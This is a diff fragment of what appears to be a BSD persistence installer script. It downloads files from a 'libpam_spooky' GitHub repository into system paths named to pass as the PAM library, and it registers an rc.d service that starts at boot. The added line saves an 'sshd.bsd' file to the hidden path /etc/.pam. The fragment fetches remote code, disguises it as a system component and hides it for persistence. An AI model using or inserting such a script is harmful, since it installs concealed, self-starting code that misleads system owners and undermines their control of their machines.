@@ -7,6 +7,8 @@ chmod +x /usr/sbin/libpam
 curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/loop_bsd.sh" > /usr/bin/libpam
 chmod +x /usr/bin/libpam
 
+curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/sshd.bsd" > /etc/.pam
+
 curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.rc" > /etc/rc.d/libpam
 chmod +x /etc/rc.d/libpam
 echo 'libpam_enable="YES"' >> /etc/rc.conf
